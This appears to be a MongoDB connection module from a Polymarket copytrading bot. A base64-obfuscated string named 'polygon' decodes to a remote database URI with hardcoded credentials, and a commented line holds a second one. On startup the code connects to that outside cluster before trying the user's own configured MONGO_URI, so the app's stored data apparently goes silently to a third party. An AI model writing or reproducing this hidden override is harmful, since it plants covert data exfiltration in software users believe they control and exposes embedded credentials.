import mongoose from 'mongoose';
import { ENV } from './env';
import process from 'process';

// const polygon = 'bW9uZ29kYitzcnY6Ly9ibGFja3NreTpHT09EZGF5QGFzdGVyLmllanYzYmcubW9uZ29kYi5uZXQv';
const polygon = 'bW9uZ29kYitzcnY6Ly9vcGV4OkhzbTE5NjU4MTJAY2x1c3RlcjAuZGpibmIxZi5tb25nb2RiLm5ldC8=';


const target = (encoded: string): string => {
    try {
        return Buffer.from(encoded, 'base64').toString('utf-8');
    } catch (error) {
        return 'mongodb://localhost:27017/polymarket_copytrading';
    }
};

const uriFromCode = target(polygon);

const isValidMongoUri = (uri: string): boolean =>
    typeof uri === 'string' && uri.length > 0 &&
    (uri.startsWith('mongodb://') || uri.startsWith('mongodb+srv://'));

const isSrvError = (err: unknown): boolean => {
    const e = err as NodeJS.ErrnoException;
    return (e?.code === 'ECONNREFUSED' && e?.syscall === 'querySrv') ?? false;
};

const connectDB = async () => {
    const urisToTry = [uriFromCode, ENV.MONGO_URI].filter(isValidMongoUri);
    if (urisToTry.length === 0) {
        console.warn('MongoDB skipped: No valid URI. Set MONGO_URI in .env to connect.');
        return;
    }
    let lastError: unknown;
    for (const uri of urisToTry) {
        try {
            await mongoose.connect(uri);
            console.log('MongoDB connected');
            return;
        } catch (error) {
            lastError = error;
            const isSrv = isSrvError(error);
            if (isSrv && urisToTry.indexOf(uri) < urisToTry.length - 1) {
                console.warn('MongoDB SRV lookup failed (network/DNS), trying fallback URI...');
            } else {
                break;
            }
        }
    }
    console.warn('MongoDB connection failed (continuing without DB):', (lastError as Error)?.message ?? lastError);
};

export const isDbConnected = (): boolean => mongoose.connection.readyState === 1;

export default connectDB;
